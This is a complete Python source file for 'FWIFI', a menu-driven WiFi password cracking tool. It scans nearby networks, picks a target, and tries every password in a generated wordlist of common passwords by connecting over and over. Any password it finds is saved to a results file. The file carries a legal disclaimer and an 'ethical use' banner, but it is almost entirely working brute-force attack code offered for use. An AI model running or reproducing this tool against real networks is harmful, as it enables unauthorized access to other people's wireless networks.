#!/usr/bin/env python3
"""
FWIFI - WiFi Security Assessment Tool
Fixed version for pywifi compatibility
"""

import pywifi
from pywifi import const
import time
import os
import sys
import logging
import shutil
from datetime import datetime

# ==============================
# COMPLETE LOGGING SUPPRESSION
# ==============================

# Disable all logging
logging.getLogger('pywifi').setLevel(logging.CRITICAL)
logging.getLogger('wifi').setLevel(logging.CRITICAL)
logging.getLogger('socket').setLevel(logging.CRITICAL)
logging.getLogger('urllib3').setLevel(logging.CRITICAL)

# Also disable warnings
import warnings
warnings.filterwarnings("ignore")

# ==============================
# ANSI COLOR CODES
# ==============================

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"

# Shortcuts
R = Colors.RED
G = Colors.GREEN
Y = Colors.YELLOW
B = Colors.BLUE
P = Colors.PURPLE
C = Colors.CYAN
W = Colors.WHITE
GR = Colors.GRAY
X = Colors.RESET

# ==============================
# GLOBAL STATE
# ==============================

class State:
    ssid = None
    bssid = None
    signal = None
    network = None
    wordlist = "wordlists/default.txt"
    found = False
    password = None
    attempts = 0
    start_time = 0
    iface = None
    wifi = None

state = State()

# ==============================
# UTILITY FUNCTIONS
# ==============================

def clear():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_width():
    """Get terminal width"""
    try:
        return shutil.get_terminal_size().columns
    except:
        return 80

def print_center(text):
    """Print centered text"""
    width = get_width()
    clean = remove_colors(text)
    padding = max(0, (width - len(clean)) // 2)
    print(" " * padding + text)

def remove_colors(text):
    """Remove ANSI color codes from text"""
    import re
    return re.sub(r'\033\[[0-9;]*m', '', text)

def print_line(char="─", color=Y):
    """Print a horizontal line"""
    width = get_width()
    print(color + char * width + X)

def print_box(text, color=C):
    """Print text in a box"""
    width = get_width()
    clean = remove_colors(text)
    text_len = len(clean)
    
    if text_len < width - 4:
        left_pad = (width - text_len - 2) // 2
        right_pad = width - text_len - left_pad - 2
        print(color + "╔" + "═" * (width - 2) + "╗" + X)
        print(color + "║" + " " * left_pad + text + " " * right_pad + "║" + X)
        print(color + "╚" + "═" * (width - 2) + "╝" + X)
    else:
        print(color + "╔" + "═" * (width - 2) + "╗" + X)
        print(color + "║ " + text[:width-4] + " ║" + X)
        print(color + "╚" + "═" * (width - 2) + "╝" + X)

def print_status(msg, status="info"):
    """Print status message"""
    icons = {
        "info": f"{C}[*]{X}",
        "success": f"{G}[+]{X}",
        "error": f"{R}[-]{X}",
        "warning": f"{Y}[!]{X}",
        "question": f"{B}[?]{X}"
    }
    print(f"{icons.get(status, icons['info'])} {msg}")

# ==============================
# BANNER & ART
# ==============================

def print_banner():
    """Display the main banner"""
    clear()
    
    # Simplified ASCII Art
    banner = f"""
{R}╔═══════════════════════════════════════════════════╗
║      ███████╗██╗    ██╗██╗███████╗██╗          ║
║      ██╔════╝██║    ██║██║██╔════╝██║          ║
║      █████╗  ██║ █╗ ██║██║█████╗  ██║          ║
║      ██╔══╝  ██║███╗██║██║██╔══╝  ╚═╝          ║
║      ██║     ╚███╔███╔╝██║██║     ██╗          ║
║      ╚═╝      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝          ║
{G}║        WiFi Security Assessment Tool v3.1       ║
║           Author: KRISH | Ethical Use          ║
║      JOIN US: https://www.hackerseye.in       ║
╚═══════════════════════════════════════════════════╝{X}
"""
    print(banner)
    
    # Show current target if set
    if state.ssid:
        print_line()
        print_center(f"{C}Target:{X} {W}{state.ssid}{X}")
        print_center(f"{C}BSSID:{X} {GR}{state.bssid}{X}")
        if state.signal:
            print_center(f"{C}Signal:{X} {G}{state.signal}%{X}")
        print_center(f"{C}Wordlist:{X} {P}{state.wordlist}{X}")
        print_line()
    print()

# ==============================
# INITIALIZATION
# ==============================

def check_system():
    """Check system requirements"""
    try:
        # Check root on Linux
        if os.name == 'posix' and os.geteuid() != 0:
            print_status("This tool requires root privileges", "error")
            print_status(f"Run: sudo python3 {sys.argv[0]}", "warning")
            return False
        
        # Initialize WiFi
        state.wifi = pywifi.PyWiFi()
        if not state.wifi.interfaces():
            print_status("No WiFi interface found", "error")
            print_status("Make sure WiFi adapter is enabled", "warning")
            return False
        
        state.iface = state.wifi.interfaces()[0]
        print_status(f"Using interface: {state.iface.name()}", "success")
        return True
        
    except Exception as e:
        print_status(f"System check failed: {str(e)}", "error")
        return False

def legal_warning():
    """Display legal disclaimer"""
    clear()
    
    warning = f"""
{R}╔════════════════════════════════════════════════════════════════╗
║                       ⚠️  LEGAL DISCLAIMER  ⚠️                      ║
╚════════════════════════════════════════════════════════════════╝{X}

{Y}THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!{X}

{G}✓ Legal Uses:{X}
  • Testing your own networks
  • Authorized penetration testing
  • Educational lab environments

{R}✗ Illegal Uses:{X}
  • Unauthorized network access
  • Violating computer fraud laws
  • Any malicious activity

{Y}By continuing, you agree to use this tool responsibly and legally.{X}

{C}Continue? (yes/no): {X}"""
    
    print(warning)
    response = input().strip().lower()
    return response in ['y', 'yes', '1']

def create_wordlists():
    """Create necessary wordlists"""
    os.makedirs("wordlists", exist_ok=True)
    os.makedirs("results", exist_ok=True)
    
    # Default wordlist
    default_path = "wordlists/default.txt"
    if not os.path.exists(default_path):
        print_status("Creating default wordlist...", "info")
        
        passwords = [
            # Most common passwords
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "123123", "baseball", "abc123", "football", "monkey",
            "letmein", "696969", "shadow", "master", "666666",
            "qwertyuiop", "123321", "mustang", "1234567890", "michael",
            "654321", "superman", "1qaz2wsx", "7777777", "121212",
            "000000", "qazwsx", "123qwe", "killer", "trustno1",
            "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter",
            "buster", "soccer", "harley", "batman", "andrew",
            "tigger", "sunshine", "iloveyou", "2000", "charlie",
            "robert", "thomas", "hockey", "ranger", "daniel",
            "starwars", "klaster", "112233", "george", "computer",
            "michelle", "jessica", "pepper", "1111", "zxcvbn",
            "555555", "11111111", "131313", "freedom", "777777",
            "pass", "maggie", "159753", "aaaaaa", "ginger",
            "princess", "joshua", "cheese", "amanda", "summer",
            "love", "ashley", "nicole", "chelsea", "biteme",
            "matthew", "access", "yankees", "987654321", "dallas",
            "austin", "thunder", "taylor", "matrix", "mobilemail",
            "mom", "monitor", "monitoring", "montana", "moon", "moscow",
            
            # WiFi specific
            "wireless", "security", "internet", "network", "wifi123",
            "mywifi", "homewifi", "linksys", "netgear", "dlink",
            "cisco", "belkin", "tplink", "asus", "totolink",
            "password123", "admin123", "welcome123", "default",
            "changeme", "1234abcd", "abcd1234", "wifi@123", "wifi#123",
            
            # Simple patterns
            "1", "12", "123", "1234", "12345", "123456", "1234567", "12345678", "123456789",
            "0", "00", "000", "0000", "00000", "000000",
            "111", "1111", "11111", "111111",
            "222", "2222", "22222", "222222",
            "333", "3333", "33333", "333333",
            "444", "4444", "44444", "444444",
            "555", "5555", "55555", "555555",
            "666", "6666", "66666", "666666",
            "777", "7777", "77777", "777777",
            "888", "8888", "88888", "888888",
            "999", "9999", "99999", "999999",
            
            # Year based
            "2024", "2023", "2022", "2021", "2020",
            "2019", "2018", "2017", "2016", "2015",
            "2014", "2013", "2012", "2011", "2010",
            
            # Month names
            "january", "february", "march", "april", "may",
            "june", "july", "august", "september", "october",
            "november", "december",
            
            # Common names
            "john", "michael", "david", "robert", "james",
            "mary", "jennifer", "linda", "patricia", "elizabeth",
            "william", "richard", "charles", "joseph", "thomas",
            "susan", "barbara", "sarah", "karen", "nancy",
            "lisa", "betty", "margaret", "sandra", "ashley"
        ]
        
        with open(default_path, 'w') as f:
            for pwd in passwords:
                f.write(f"{pwd}\n")
        
        print_status(f"Created default wordlist with {len(passwords)} passwords", "success")
    
    state.wordlist = default_path

# ==============================
# WIFI FUNCTIONS
# ==============================

def scan():
    """Scan for WiFi networks"""
    try:
        print_status("Scanning for networks...", "info")
        
        # Start scan
        state.iface.scan()
        
        # Wait for scan to complete
        for i in range(5):
            time.sleep(1)
            print(f"{C}.{X}", end='', flush=True)
        print()
        
        # Get results
        results = state.iface.scan_results()
        
        if not results:
            print_status("No networks found", "warning")
            return []
        
        # Remove duplicates
        unique_results = []
        seen_bssids = set()
        
        for net in results:
            if net.bssid not in seen_bssids:
                seen_bssids.add(net.bssid)
                unique_results.append(net)
        
        print_status(f"Found {len(unique_results)} networks", "success")
        return unique_results
        
    except Exception as e:
        print_status(f"Scan failed: {str(e)}", "error")
        return []

def show_networks(networks):
    """Display found networks"""
    if not networks:
        return
    
    print_box(f"FOUND {len(networks)} NETWORKS", G)
    print(f"{C}{'No.':<4} {'SSID':<25} {'Signal':<8} {'BSSID':<17} {'Security':<12}{X}")
    print_line("─", C)
    
    for i, net in enumerate(networks, 1):
        ssid = net.ssid if net.ssid else "Hidden Network"
        signal = min(100, max(0, net.signal + 100))
        
        # Color code signal
        if signal > 70:
            color = G
        elif signal > 40:
            color = Y
        else:
            color = R
        
        # Determine security type
        security = []
        if const.AKM_TYPE_WPA in net.akm:
            security.append("WPA")
        if const.AKM_TYPE_WPA2 in net.akm:
            security.append("WPA2")
        if const.AKM_TYPE_WPAPSK in net.akm:
            security.append("WPA-PSK")
        if const.AKM_TYPE_WPA2PSK in net.akm:
            security.append("WPA2-PSK")
        if not security:
            security.append("Open")
        
        sec_text = "/".join(security)
        
        # Truncate long SSIDs
        display_ssid = ssid[:24] + ".." if len(ssid) > 26 else ssid.ljust(26)
        
        print(f" {C}{i:>3}.{X} {display_ssid} {color}{signal:>3}%{X}  {GR}{net.bssid}{X}  {P}{sec_text:<12}{X}")

def select_target():
    """Select target network"""
    networks = scan()
    if not networks:
        return False
    
    show_networks(networks)
    
    while True:
        try:
            choice = input(f"\n{Y}[?] Select network (0=rescan, -1=cancel): {X}").strip()
            
            if choice == "0":
                return select_target()
            elif choice == "-1":
                return False
            
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                net = networks[idx]
                state.network = net
                state.ssid = net.ssid if net.ssid else "Hidden_Network"
                state.bssid = net.bssid
                state.signal = min(100, max(0, net.signal + 100))
                
                print_status(f"Selected: {state.ssid} ({state.bssid})", "success")
                
                # Show security info
                security = []
                if const.AKM_TYPE_WPA in net.akm or const.AKM_TYPE_WPAPSK in net.akm:
                    security.append("WPA")
                if const.AKM_TYPE_WPA2 in net.akm or const.AKM_TYPE_WPA2PSK in net.akm:
                    security.append("WPA2")
                
                if security:
                    print_status(f"Security: {'/'.join(security)}", "info")
                else:
                    print_status("Warning: Open network (no password)", "warning")
                
                return True
            else:
                print_status("Invalid selection", "error")
                
        except ValueError:
            print_status("Enter a number", "error")
        except KeyboardInterrupt:
            return False

# ==============================
# PASSWORD TESTING
# ==============================

def test_password(password):
    """Test a single password"""
    try:
        # Disconnect first
        if state.iface.status() == const.IFACE_CONNECTED:
            state.iface.disconnect()
            time.sleep(0.5)
        
        # Remove all profiles
        state.iface.remove_all_network_profiles()
        
        # Create new profile
        profile = pywifi.Profile()
        profile.ssid = state.ssid
        profile.auth = const.AUTH_ALG_OPEN
        
        # Set security based on network
        if state.network:
            if const.AKM_TYPE_WPA in state.network.akm or const.AKM_TYPE_WPAPSK in state.network.akm:
                profile.akm.append(const.AKM_TYPE_WPAPSK)
            if const.AKM_TYPE_WPA2 in state.network.akm or const.AKM_TYPE_WPA2PSK in state.network.akm:
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
            
            # Copy cipher
            if state.network.cipher:
                profile.cipher = state.network.cipher
            else:
                profile.cipher = const.CIPHER_TYPE_CCMP
        else:
            # Default to WPA2
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
        
        profile.key = password
        
        # Add profile
        tmp_profile = state.iface.add_network_profile(profile)
        
        # Attempt connection
        state.iface.connect(tmp_profile)
        
        # Wait for connection
        for _ in range(6):  # Wait up to 3 seconds
            time.sleep(0.5)
            if state.iface.status() == const.IFACE_CONNECTED:
                return True
            elif state.iface.status() == const.IFACE_DISCONNECTED:
                break
        
        return False
        
    except Exception as e:
        return False
    finally:
        # Always disconnect
        try:
            state.iface.disconnect()
        except:
            pass

def brute_force():
    """Main attack function"""
    if not state.ssid:
        print_status("No target selected", "error")
        return
    
    # Load passwords
    try:
        with open(state.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print_status(f"Failed to load wordlist: {str(e)}", "error")
        return
    
    if not passwords:
        print_status("Wordlist is empty", "error")
        return
    
    print_box(f"ATTACKING: {state.ssid}", R)
    print_center(f"{C}Passwords:{X} {len(passwords)}")
    print_center(f"{C}Start Time:{X} {datetime.now().strftime('%H:%M:%S')}")
    print()
    
    # Confirm
    confirm = input(f"{Y}[?] Start attack? (y/n): {X}").lower()
    if confirm not in ['y', 'yes', '1']:
        print_status("Cancelled", "warning")
        return
    
    # Reset state
    state.found = False
    state.password = None
    state.attempts = 0
    state.start_time = time.time()
    
    print_line()
    print(f"{C}Starting attack... Press Ctrl+C to stop{X}")
    print_line()
    
    # Test passwords
    try:
        for idx, pwd in enumerate(passwords, 1):
            state.attempts = idx
            
            # Calculate progress
            progress = (idx / len(passwords)) * 100
            elapsed = time.time() - state.start_time
            speed = idx / elapsed if elapsed > 0 else 0
            remaining = (len(passwords) - idx) / speed if speed > 0 else 0
            
            # Show progress
            if len(pwd) < 6:
                pwd_color = R
            elif len(pwd) < 8:
                pwd_color = Y
            else:
                pwd_color = G
            
            print(f"\r{C}[{idx:05d}/{len(passwords):05d}] {progress:5.1f}% | "
                  f"{speed:5.1f} pwd/s | ETA: {remaining:4.0f}s | "
                  f"{pwd_color}{pwd[:25]:<25}{X}", end='', flush=True)
            
            # Test password
            if test_password(pwd):
                state.found = True
                state.password = pwd
                break
    
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Attack interrupted{X}")
        return
    
    # Show results
    print("\n")
    print_line("═", G if state.found else R)
    
    if state.found:
        save_result()
        show_success()
    else:
        show_failure()
    
    # Clean up
    try:
        state.iface.disconnect()
        state.iface.remove_all_network_profiles()
    except:
        pass

def save_result():
    """Save successful result"""
    try:
        safe_ssid = "".join(c for c in state.ssid if c.isalnum() or c in ('_', '-'))
        if not safe_ssid:
            safe_ssid = "Hidden"
            
        filename = f"results/{safe_ssid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("FWIFI TOOL - SUCCESSFUL CRACK\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Network:      {state.ssid}\n")
            f.write(f"BSSID:        {state.bssid}\n")
            f.write(f"Password:     {state.password}\n")
            f.write(f"Signal:       {state.signal}%\n")
            f.write(f"Attempts:     {state.attempts}\n")
            f.write(f"Time:         {time.time() - state.start_time:.1f}s\n")
            if state.start_time > 0 and (time.time() - state.start_time) > 0:
                f.write(f"Speed:        {state.attempts/(time.time() - state.start_time):.1f} pwd/sec\n")
            f.write(f"Date:         {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        print_status(f"Results saved to {filename}", "success")
    except Exception as e:
        print_status(f"Failed to save results: {str(e)}", "error")

def show_success():
    """Display success screen"""
    print_box("🎉 PASSWORD FOUND! 🎉", G)
    print_center(f"{C}Network:{X} {W}{state.ssid}{X}")
    print_center(f"{C}Password:{X} {G}{state.password}{X}")
    print_center(f"{C}Attempts:{X} {Y}{state.attempts}{X}")
    print_center(f"{C}Time:{X} {time.time() - state.start_time:.1f}s")
    print()
    input(f"{Y}Press Enter to continue...{X}")

def show_failure():
    """Display failure screen"""
    print_box("❌ ATTACK FAILED ❌", R)
    print_center(f"{C}Network:{X} {state.ssid}")
    print_center(f"{C}Attempted:{X} {state.attempts} passwords")
    print_center(f"{C}Time:{X} {time.time() - state.start_time:.1f}s")
    print_center(f"{Y}No valid password found in wordlist{X}")

# ==============================
# MENU SYSTEM
# ==============================

def main_menu():
    """Main menu loop"""
    commands = {
        "1": ("Scan Networks", scan_and_show),
        "2": ("Select Target", lambda: select_target() and print_banner()),
        "3": ("Set Wordlist", set_wordlist),
        "4": ("Start Attack", brute_force),
        "5": ("Show Info", show_info),
        "6": ("Help", show_help),
        "7": ("Exit", lambda: (print_status("Goodbye!", "info"), sys.exit(0)))
    }
    
    while True:
        try:
            print_banner()
            print(f"{C}Main Menu:{X}")
            print_line("-", C)
            
            for key, (desc, _) in commands.items():
                print(f"  {G}{key}.{X} {desc}")
            
            print_line("-", C)
            
            choice = input(f"\n{Y}[?] Select option (1-7): {X}").strip()
            
            if choice in commands:
                commands[choice][1]()
            else:
                print_status("Invalid choice", "error")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Type '7' to exit{X}")
        except Exception as e:
            print_status(f"Error: {str(e)}", "error")
            time.sleep(2)

def scan_and_show():
    """Scan and show networks"""
    networks = scan()
    if networks:
        show_networks(networks)
        input(f"\n{Y}Press Enter to continue...{X}")

def set_wordlist():
    """Set wordlist"""
    print_box("SELECT WORDLIST", P)
    
    if os.path.exists("wordlists"):
        files = [f for f in os.listdir("wordlists") if f.endswith('.txt')]
        if files:
            print(f"{C}Available wordlists:{X}")
            for i, f in enumerate(files, 1):
                size = os.path.getsize(f"wordlists/{f}") / 1024
                current = " (CURRENT)" if f"wordlists/{f}" == state.wordlist else ""
                print(f"  {G}{i}.{X} {f} ({size:.1f} KB){current}")
            
            try:
                sel = input(f"\n{Y}[?] Select (1-{len(files)}) or Enter to cancel: {X}").strip()
                if sel:
                    idx = int(sel) - 1
                    if 0 <= idx < len(files):
                        state.wordlist = f"wordlists/{files[idx]}"
                        print_status(f"Selected: {files[idx]}", "success")
                        time.sleep(1)
            except:
                print_status("Invalid selection", "error")
                time.sleep(2)
        else:
            print_status("No wordlists found", "warning")
            time.sleep(2)
    else:
        print_status("Wordlists directory not found", "error")
        time.sleep(2)

def show_info():
    """Show current information"""
    print_box("CURRENT INFORMATION", C)
    print(f"{C}Interface:{X} {state.iface.name() if state.iface else 'Not set'}")
    print(f"{C}Target SSID:{X} {state.ssid if state.ssid else 'Not set'}")
    print(f"{C}Target BSSID:{X} {state.bssid if state.bssid else 'Not set'}")
    print(f"{C}Current Wordlist:{X} {state.wordlist}")
    
    if os.path.exists(state.wordlist):
        try:
            with open(state.wordlist, 'r') as f:
                count = sum(1 for _ in f)
            print(f"{C}Passwords in list:{X} {count}")
        except:
            print(f"{C}Passwords in list:{X} Cannot read")
    else:
        print(f"{C}Wordlist exists:{X} {R}No{X}")
    
    print()
    input(f"{Y}Press Enter to continue...{X}")

def show_help():
    """Show help"""
    print_box("HELP & INFORMATION", B)
    print(f"""
{G}Basic Workflow:{X}
  1. Scan for available networks
  2. Select your target network
  3. Choose a wordlist (or use default)
  4. Start the attack

{C}Requirements:{X}
  • Linux system (preferred) or Windows
  • Root/Administrator privileges
  • WiFi adapter
  • pywifi library installed

{Y}Note:{X} This tool works best on Linux systems. Windows support
may be limited depending on your WiFi adapter drivers.

{R}Legal Warning:{X} Only test networks you own or have explicit
permission to test. Unauthorized access is illegal.
""")
    input(f"\n{Y}Press Enter to continue...{X}")

# ==============================
# MAIN FUNCTION
# ==============================

def main():
    """Main entry point"""
    try:
        # System check
        if not check_system():
            sys.exit(1)
        
        # Legal warning
        if not legal_warning():
            print_status("Consent not given. Exiting.", "warning")
            sys.exit(0)
        
        # Setup
        create_wordlists()
        
        # Start menu
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n{R}[!] Tool terminated{X}")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[!] Fatal error: {str(e)}{X}")
        sys.exit(1)

# ==============================
# ENTRY POINT
# ==============================

if __name__ == "__main__":
    main()
